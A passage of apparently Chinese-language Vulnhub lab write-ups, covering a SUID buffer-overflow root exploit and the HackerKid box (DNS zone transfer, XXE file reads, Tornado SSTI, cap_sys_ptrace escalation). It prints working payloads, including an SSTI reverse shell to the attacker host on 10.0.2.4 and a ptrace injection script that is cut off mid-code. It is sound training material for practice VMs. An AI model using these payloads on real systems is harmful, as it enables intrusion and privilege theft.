<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405222307.png" /></p>
<p>成功提权到<code>socnet</code>。然后再次进行shell升级。</p>
<h2 id="第二次权限提升缓存区溢出漏洞">第二次权限提升——缓存区溢出漏洞</h2>
<p>首先，在<code>socnet</code>的家目录下有三个文件（目录），并且<code>add_record</code>具有SUID，所有者为root。因此，想办法通过该可执行文件获得root权限。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405223223.png" /></p>
<p>注意到<code>peda</code>，这是一款动态调试的工具。<a href="https://www.jianshu.com/p/283b5466684b">peda信息</a></p>
<p>思路：动态调试<code>add_record</code>，找到缓冲区溢出漏洞，利用漏洞</p>
<h3 id="动态调试">动态调试</h3>
<p>首先执行该程序，发现需要依次填写多个信息：</p>
<ol type="1">
<li>Employee Name</li>
<li>Years worked</li>
<li>Salary</li>
<li>Ever got in trouble?</li>
<li>如果上个问题答案为1，则填写Explain；否则程序结束。</li>
</ol>
<p>输入下述命令开始动态调试： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb -q ./add_record</span><br><span class="line"></span><br><span class="line">再次输入r才可以执行该程序。</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>如何找缓冲去漏洞呢？首先就是生成一长串的字符A，然后找到所有的数据提交点，每次测试一个提交点。比如上述有5个提交点，第一次将生成的字符串输入到Employee Name，其他提交点正常传入数据，以此类推。 这样就可以通过查看其他寄存器是否充满字符A来判断是否存在缓冲区漏洞。</p>
</blockquote>
<p>这里做一组对比，第一组测试<code>Employee Name</code>：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405224330.png" /></p>
<p>直接退出程序，说明该提交点并不存在缓冲区漏洞。</p>
<p>第二组测试<code>Explain</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405224520.png" /></p>
<p>可以看到许多寄存器都是A，证明该提交点存在缓冲区溢出漏洞。<strong>注意寄存器<code>EIP</code>，该寄存器存放的是CPU执行的下一条指令的存放地址</strong>。</p>
<p>接着，需要判断EIP中的4个A是提交的字符串中的哪几个，可以先不断减少字符A的个数，然后提交，直到找到。也可以生成特征字符串（每4个为一个子串，在整个字符串中。子串是唯一的） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pattern create [len] # 长度至少要保证EIP中充满A</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405225135.png" /></p>
<p>然后利用命令自动查找位置： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pattern search</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405225310.png" /></p>
<p>EIP的第一个字符在特征字符串的位置是62（位置从0开始），因此，EIP在字符串中的位置就是62，63，64，65四个位置。可以验证一下，生成如下字符串：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405225456.png" /></p>
<p>然后带入进去，如果此时EIP内是BCDE，则代表位置正确。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405225548.png" /></p>
<p>位置正确</p>
<h3 id="查看汇编代码">查看汇编代码</h3>
<h4 id="该程序的汇编代码">该程序的汇编代码</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">disas main</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405230105.png" /></p>
<p>尖括号里面是函数，带<code>@plt</code>的是自带的函数，不带的则是自己编写的函数。<code>call</code>代表调用。最前面的16进制数字表示该指令存放的内存地址。</p>
<p>可以通过打断点调试，测试函数的功能（以<code>0x080487ea</code>为例，断点要打在这句话的前一个位置）。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">break *0x080487e7</span><br><span class="line">r</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405230637.png" /></p>
<p>当输入1之后程序停止了，输入<code>s</code>单步运行，然后正好到我们要测试的函数<code>getchar@plt</code>，说明这里的作用就是获得我们的输入。</p>
<p>注意到这里有一个<code>vuln</code>的函数。可以利用<code>info func</code>查看该程序的所有函数，发现里面有<code>system@plt, setuid@plt, vuln, backdoor</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405231236.png" /></p>
<h4 id="vuln函数的汇编代码">vuln函数的汇编代码</h4>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405231350.png" /></p>
<p>注意<code>strcpy@plt</code>，这个函数存在着漏洞。<a href="https://stackoverflow.com/questions/48356481/exploiting-strcpy-in-c-with-buffer-overflow">strcpy缓冲区溢出漏洞</a></p>
<p>因此，之前测试的缓冲区溢出漏洞出现的原因就是主函数调用<code>vuln</code>，然后<code>vuln</code>又调用了该函数造成的。</p>
<h4 id="backdoor函数的汇编代码">backdoor函数的汇编代码</h4>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405231651.png" /></p>
<p>注意到这里先运行了<code>setuid</code>，然后运行了<code>system</code>，也就是此时的<code>system</code>可能是以root权限运行的。那么此时就需要知道<code>system</code>执行了什么命令。</p>
<p><strong>复制<code>backdoor</code>第一条指令的地址。然后利用缓冲区溢出的漏洞，将该地址放到EIP中，这样，随着程序的执行，就会将<code>backdoor</code>函数调用</strong>。</p>
<blockquote>
<p>可以生成一个文件，把每一个问题的回答都写入，回答之间用换行符分割，然后 r &lt; filename，自动化执行。</p>
</blockquote>
<p>第一步，生成一个文件 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import struct; print(&#x27;h\n1\n1\n1\n&#x27; + &#x27;A&#x27;*62 + struct.pack(&#x27;I&#x27;, 0x08048676))&quot;</span> &gt; payload</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406103054.png" /></p>
<p>（观察前面注入BCDE的时候，EIP内容是BCDE，但是16进制是0x45444342，可以看到顺序被颠倒了，因此，我们写入backdoor函数的第一条指令的地址的时候也需要颠倒以下写进去，所以使用<code>struct.pack</code>）</p>
<p>第二步，执行命令 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r &lt; payload</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406103200.png" /></p>
<p>注意下几句话： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[New process 4825]</span><br><span class="line">process 4825 is executing new program: /bin/dash</span><br><span class="line">[New process 4826]</span><br><span class="line">process 4826 is executing new program: /bin/bash</span><br></pre></td></tr></table></figure></p>
<p>当我们往<code>EIP</code>写入<code>backdoor</code>指令后，该程序就会自动调用<code>backdoor</code>函数，结果如上。如果没有调用该函数，那么就不会出现上述结果。因此，<code>backdoor</code>函数执行了<code>/bin/bash</code>和<code>/bin/dash</code>，并且在该程序执行完毕之后退出。</p>
<p>因此，我们只需要正常的执行程序，然后在Explain处将<code>backdoor</code>函数的第一条指令写入到<code>EIP</code>寄存器即可获得root权限。</p>
<p>第三步，动态调试验证 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">break vuln </span><br></pre></td></tr></table></figure></p>
<p>单步执行到<code>backdoor</code>函数之后就需要慢点操作了。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406104348.png" /></p>
<p>单步执行到<code>setuid</code>函数。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406104448.png" /></p>
<p>该函数执行完毕之后取得suid权限。然后注意单步执行到下图：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406105131.png" /></p>
<p>将<code>/bin/bash</code>写入到EAX寄存器，然后调用<code>system</code>函数去执行EAX中的指令，这样得到的结果就是root权限的shell。</p>
<h3 id="漏洞利用">漏洞利用</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat payload - | ./add_record</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406105554.png" /></p>
<p>（管道符前面的减号的意思是将payload中的内容作为标准输入输出。）</p>
<p>成功获得root权限，这台靶机到此就全部结束了。</p>
<h1 id="总结">总结</h1>
<p>这台靶机难度很大，涉及到了<strong>缓冲区溢出漏洞</strong>，这是我第一次见识到这种漏洞，因此可能存在着错误。</p>
<p>Linux提权中优先考虑：内核漏洞、SUID、SUDO配置。但是这台靶机将SUID和缓冲区溢出漏洞结合在一起。这为提权带来了一种思路！</p>
<p>如果http服务存在着注册功能点，一定要尝试一下，看一些登陆进去的界面是否存在着漏洞！但是，千万别写真实的个人信息。</p>
<p>遇到新的技术——XMLRPC，需要快速的掌握其工作原理。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>缓冲区溢出漏洞</tag>
        <tag>XMLRPC命令执行</tag>
        <tag>动态调试</tag>
      </tags>
  </entry>
  <entry>
    <title>7 Vulnhub HackerKid1.0.1 Writeup</title>
    <url>/2022/04/08/7%20Vulnhub%20HackerKid1.0.1%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度介于简单和中等之间，具有OSCP风格，不建议爆破，每一步都会有适当的提示。渗透所用到的攻击方式比较新（较前几个靶机来说）。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：<a href="https://www.vulnhub.com/entry/hacker-kid-101,719/">hacker_kid</a></p>
<p>难度：Easy/Medium (Intermediate)。OSCP风格的中级难度靶机</p>
<p>目标：取得root权限（关注信息收集，不需要蛮力破解，每一步都有适当的提示）</p>
<p>涉及攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>Web信息收集</li>
<li><strong>DNS域传送</strong></li>
<li>XXE注入攻击</li>
<li>SSTI模板注入</li>
<li><strong>Capabilities提权</strong></li>
</ul>
<h1 id="dns域传送">DNS域传送</h1>
<h2 id="dns域简介">DNS域简介</h2>
<p>DNS (Domain Name System)的作用是将域名转为对应的IP。<strong>DNS域是DNS服务器提供服务的域名空间的一部分</strong>。例如，<code>cloudflare.com</code>及其所有子域（<code>*.cloudflare.com</code>）可能是一个DNS域，当然<code>blog.example.com</code>也可能是一个单独的DNS域。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407230721.png" /></p>
<p><strong>同一个服务器上可以有多个web应用</strong>，一般有以下三种情况：</p>
<ol type="1">
<li>给这台服务器分配多个IP地址，每个web应用的域名对应的IP地址都不一样，这样子就可以通过不同的域名或者IP地址访问不同的web应用；</li>
<li>这台服务器只有一个IP地址，但是开放多个端口，可以把不同的web应用绑定在不同的端口上，这样子就能够通过不同的域名访问对应的web应用；</li>
<li>这台服务器只有一个IP地址，也只开放了一个端口，这时候就需要利用<strong>虚拟主机技术</strong>，就是通过不同的域名去访问这台服务器，服务器会根据域名响应对应的web应用；（比如：<code>/etc/hosts</code>中将不同的域名对应同一个IP）</li>
</ol>
<h2 id="为什么需要dns域传送">为什么需要DNS域传送</h2>
<p>DNS是非常重要的一个服务，如果DNS域的DNS服务器不工作，或者保存的信息过期了，那么这个域内的所有域名都无法被解析，因而对应的服务也就无法被访问。因此，每个域至少应该有两个DNS服务器，对于更关键的区域，可能存在着更多的DNS服务器。</p>
<p>有的DNS域非常的大，并且域内的信息可能经常改变。此时，如果管理员在该域内的每台DNS服务器上手动的修改信息的话，这不仅耗费大量的时间，而且也容易出错。因此，这时候就需要DNS域传送机制。</p>
<p>DNS域传送的作用：管理员只需要在主DNS服务器上进行修改，然后其他DNS服务器可以通过某种协议来请求主DNS服务器上的全部信息。其中最简单的协议就是<code>AXFR</code>。</p>
<h2 id="dns域传送漏洞">DNS域传送漏洞</h2>
<p>其实主要的是<code>AXFR</code>协议存在漏洞，该协议允许域内所有客户端请求DNS服务器上的信息。只需要获得一台域内的主机，就可以通过该漏洞获得该DNS域内所有子域名。本质上就是一种<strong>信息泄露漏洞</strong>。</p>
<h2 id="dns域名解析">DNS域名解析</h2>
<p>DNS服务同时占用TCP和UDP的53端口。DNS在进行域传送的时候使用TCP协议，其它时候则使用UDP协议。</p>
<p>所以，如果一台主机开启了<code>53/TCP</code>，那么该主机也极大可能开启<code>53/UDP</code>，并且该主机基本可以认定为是一台DNS服务器。但是反过来，如果某台主机开启了<code>53/UDP</code>，那么该主机不一定开启了<code>53/TCP</code>，因此，该主机是DNS服务器的可能性也不大。</p>
<h1 id="capabilities技术">Capabilities技术</h1>
<p>Capabilities是Linux的一个内核功能。作用：权限管理。该功能将操作系统很多需要特权才能执行的操作（通常只有root和管理员才能执行的系统操作）分成40+个功能。每一个功能都能单独的赋予给程序。当某个程序被赋予了功能，那么即使执行该程序的只是普通用户（不是root，没有suid，不在root组等），也能够使用对应的特权操作。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setcap</span> cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap</span><br><span class="line"><span class="comment"># 赋予/usr/bin/dumpcap程序抓数据包和抓网络管理相应组件两种能力。</span></span><br></pre></td></tr></table></figure>
<p>参考文档：<a href="https://linux.die.net/man/7/capabilities">Capabilities</a></p>
<h1 id="渗透">渗透</h1>
<p>攻击机kali：10.0.2.4</p>
<h2 id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l <span class="comment"># 靶机为10.0.2.10</span></span><br><span class="line">sudo nmap -p- 10.0.2.10</span><br><span class="line">sudo nmap -p53,80,9999 -A 10.0.2.10</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408084845.png" /></p>
<p>53端口上是域服务，版本为ISC BIND 9.16.1，并且开启的是53/TCP，有理由认为该主机是域内的DNS服务器，并且53/UDP也是开启着的。输入下面命令验证下： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p53 -sU 10.0.2.10</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408085115.png" /></p>
<p>发现确实如此。ISC BIND 9.16.1 存在着两个远程代码执行漏洞，编号为CVE-2020-8625和CVE-2021-25216（找不到漏洞利用代码）</p>
<p>80端口和9999端口开着的都是http服务。80端口上是apache2，9999端口上是tornado，这是python语言的一个模板，所以后续可能会用到模板注入！</p>
<p>靶机的OS是Ubuntu。</p>
<h2 id="访问http服务">访问http服务</h2>
<p>先访问80端口，页面如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408085401.png" /></p>
<p>这里注意到一个大写的单词<code>DIG</code>，这是Linux的一个工具，但是使用该工具需要知道靶机的域名，因此接下来就是需要找到关于域名的信息。</p>
<p>查看页面源码的小技巧：</p>
<ol type="1">
<li>一方面关注这个页面到底引用了哪些页面资源，存在哪些路径</li>
<li>另一方面得关注<strong>注释信息</strong></li>
</ol>
<p>查看源码，在最后发现了某一行注释： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TO DO: Use a GET parameter page_no  to view pages.</span><br></pre></td></tr></table></figure></p>
<p>也就是在该页面上存在着一个参数<code>page_no</code>，以GET方式提交。</p>
<p>又看了一些其他网址，比如主页上的<code>App</code>和<code>Form</code>，<strong>直接点击会出现<code>10.0.2.10/#from.html</code>，把<code>#</code>去掉就可以直接访问了</strong>。但是，发现虽然有很多表单，但是并没有可用的地方，基本都只是做个样子。</p>
<p>那先带入<code>page_no</code>去访问一下，看一下页面会不会发生什么变化。尝试了1，2，3，4之后发现变化都一样，多了一句话<code>Oh Man !! Isn't is right to go a little deep inside?</code>，因此用burp来跑，后面肯定还有变化。结果发现，当<code>page_no=21</code>时，返回的响应包长度出现了变化。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408090450.png" /></p>
<p>直接访问发现页面的话变成了如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Okay so you want me to speak something ?  </span><br><span class="line">I am a hacker kid not a dumb hacker. So i created some subdomains to return back on the server whenever i want!!  </span><br><span class="line">Out of my many homes...one such home..one such home for me : hackers.blackhat.local</span><br></pre></td></tr></table></figure></p>
<p>发现了一个域名<code>hackers.blackhat.local</code>，这其实是一个三级域名，<code>blackhat.local</code>也是一个域名。因此，获得了两个域名。</p>
<p>将域名添加到<code>/etc/hosts</code>。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408091613.png" /></p>
<p>然后直接用浏览器访问，发现<code>hackers.blackhat.local</code>页面和最开始的界面一样，而<code>blackhat.local</code>没有权限访问。</p>
<p>接下来访问9999端口，发现是一个登录界面</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408091937.png" /></p>
<p>那两个域名加上9999端口也都是同样的界面，等会测试。</p>
<h2 id="dns域传送漏洞-1">DNS域传送漏洞</h2>
<p>利用<code>DIG</code>配合<code>AXFR</code>协议获取更多的域内信息。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dig axfr @10.0.2.10 hackers.blackhat.local <span class="comment"># 失败</span></span><br><span class="line">dig axfr @10.0.2.10 blackhat.local</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408092336.png" /></p>
<p>获得了更多的域名信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hackerkid.blackhat.local</span><br><span class="line">ftp.blackhat.local</span><br><span class="line">mail.blackhat.local</span><br><span class="line">hacker.blackhat.local.blackhat.local</span><br><span class="line">www.blackhat.local</span><br></pre></td></tr></table></figure></p>
<p>把这些都写入<code>/etc/hosts</code>然后用浏览器直接访问。</p>
<p>在80端口下，上面5个域名中，第一个域名出现了如下界面</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408093020.png" /></p>
<p>第五个域名没有权限访问，其他的域名都和原来的界面一样。</p>
<p>在9999端口下，5个域名访问的和之前9999端口的界面一样。</p>
<p>填写表单，抓取<code>hackerkid.blackhat.local:80</code>数据包看一下</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408093729.png" /></p>
<p>发现了两点：</p>
<ol type="1">
<li>这个表单是XML提交的</li>
<li>无论我们在<code>&lt;email&gt;</code>标签内提交什么内容，都会被原封不动的返回回来<code>Sorry, hdfzzf@gmail.com is not available !!!</code></li>
</ol>
<p>先分析第二点，不论我们输入什么内容，服务端都会原封不动得返回给我们，这是三种漏洞的特征：</p>
<ol type="1">
<li>XSS漏洞</li>
<li>XXE漏洞</li>
<li>SSTI漏洞</li>
</ol>
<p>又因为这里的表单是XML，所以怀疑这里存在着XXE漏洞。</p>
<h2 id="xxe漏洞">XXE漏洞</h2>
<p>先验证以下是否存在XXE漏洞，抓数据包修改，然后发送</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408100434.png" /></p>
<p>发现确实返回了<code>/etc/passwd</code>中的内容，说明确实存在XXE漏洞。寻找跟<code>/bin/bash</code>有关的账号： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">saket:x:1000:1000:Ubuntu,,,:/home/saket:/bin/bash</span><br></pre></td></tr></table></figure></p>
<p>然后利用该漏洞读取文件内容： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/home/saket/.bashrc <span class="comment"># bash配置信息</span></span><br><span class="line">/home/saket/id_rsa <span class="comment"># 私钥</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>但是发现什么内容都读取不出来，这时候文件可能存在内容，但是别限制不允许明文输出，于是使用 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=/home/saket/.bashrc</span><br></pre></td></tr></table></figure></p>
<p>将得到的内容解码发现了</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408101522.png" /></p>
<p>首先猜测这是哪里的密码，因为这台靶机没有开22端口，所以不存在ssh连接。忽然想到，刚刚9999端口存在登陆界面，因此去那里尝试一下。</p>
<p>发现用下面的信息登录不成功。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: Saket!#$%@!!</span><br></pre></td></tr></table></figure></p>
<p>但是配置文件中的信息不太可能是假的，那就尝试将用下面信息登录（<code>/bin/bash</code>中有saket这个账号），发现居然成功了。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: saket</span><br><span class="line">password: Saket!#$%@!!</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408102116.png" /></p>
<p>从上图中的语句中分析，可能我们需要传入一个参数<code>name</code>，当然也可以通过参数爆破，理论上是可行的，不过该靶机不建议爆破，因此先尝试一下。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408103126.png" /></p>
<p>因此，这里可能<code>name</code>可能存在着某种注入漏洞。经过测试，发现无论我们在后面加入什么值，都会原封不动的返回。根据之前的描述，共有三种情况，但是XSS和XXE不太可能出现在url中，因此猜测可能存在SSTI。并且最开始收集的信息中也显示9999端口上是tornado模板，所以SSTI的可能性很大，并且模板引擎为tornado。</p>
<h2 id="ssti漏洞-get-shell">SSTI漏洞 Get shell</h2>
<p>模板注入通杀payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;1+abcxyz&#125;&#125;$&#123;1+abcxyz&#125;&lt;%1+abcxyz%&gt;[abcxyz]</span><br></pre></td></tr></table></figure></p>
<p>如果存在报错，基本说明服务端存在SSTI。abcxyz尽量选择无规则的字符，这样可以保证服务端没有定义过该变量名。此时，服务端引用该变量名就会报错，从而判断可能存在模板注入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;7*7&#125;,&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>看一下哪一个被执行了，从而可以判断模板引擎和语言。前者表示的PHP类模板，而后者表示python类模板。Java模板不多。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408103754.png" /></p>
<p>如果是python，可以利用下面代码进行反弹shell（kali先开启监听） <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">import</span> os %&#125;&#123;&#123;os.system(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.0.2.4/3333 0&gt;&amp;1&quot;&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果报错了，需要对上述payload进行一些编码，比如url编码（花括号，百分号，引号，斜杠等特殊符号都需要编码）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%7B%25%20import%20os%20%25%7D%7B%7Bos.system(%27bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.2.4%2F3333%200%3E%261%22%27)%7D%7D</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408103958.png" /></p>
<p>成功突破边界！</p>
<h2 id="权限提升capabilities提权">权限提升——Capabilities提权</h2>
<p>不论是内核漏洞、sudo配置不当以及suid都没找到可以利用的点。也不能像<code>6 EvilBoxOne</code>一样找到拥有写权限的可利用文件。</p>
<p>这里介绍一种新的提权方式： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p>上述命令是查看系统上所有程序的功能。<code>-r</code>：递归。如果没有结果，可以先输入<code>getcap</code>查看一下位置在哪，然后 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/sbin/<span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408105514.png" /></p>
<p><strong>注意<code>cap_sys_ptrace+ep</code>可以用来提权</strong>。也就是上图中的<code>python2.7</code>拥有的功能。参考链接：<a href="https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc">cap_sys_ptrace提权</a></p>
<p>下载利用脚本，不过链接失效了。下面是脚本的源码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># inject.py# The C program provided at the GitHub Link given below can be used as a reference for writing the python script.</span></span><br><span class="line"><span class="comment"># GitHub Link: https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># Macros defined in &lt;sys/ptrace.h&gt;</span></span><br><span class="line"><span class="comment"># https://code.woboq.org/qt5/include/sys/ptrace.h.html</span></span><br><span class="line"></span><br><span class="line">PTRACE_POKETEXT = <span class="number">4</span></span><br><span class="line">PTRACE_GETREGS = <span class="number">12</span></span><br><span class="line">PTRACE_SETREGS = <span class="number">13</span></span><br><span class="line">PTRACE_ATTACH = <span class="number">16</span></span><br><span class="line">PTRACE_DETACH = <span class="number">17</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Structure defined in &lt;sys/user.h&gt;</span></span><br><span class="line"><span class="comment"># https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user_regs_struct</span>(<span class="params">ctypes.Structure</span>):</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">&quot;r15&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r14&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r13&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r12&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rbp&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rbx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r11&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r10&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r9&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r8&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rax&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rcx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rdx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rsi&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rdi&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;orig_rax&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rip&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;cs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;eflags&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rsp&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;ss&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;fs_base&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;gs_base&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;ds&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;es&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;fs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;gs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pid = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define argument type and respone type.</span></span><br><span class="line">libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]</span><br><span class="line">libc.ptrace.restype = ctypes.c_uint64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Attach to the process</span></span><br><span class="line">libc.ptrace(PTRACE_ATTACH, pid, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line">registers = user_regs_struct()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Retrieve the value stored in registers</span></span><br><span class="line">libc.ptrace(PTRACE_GETREGS, pid, <span class="literal">None</span>, ctypes.byref(registers))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Instruction Pointer: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"></span><br><span class="line"><span 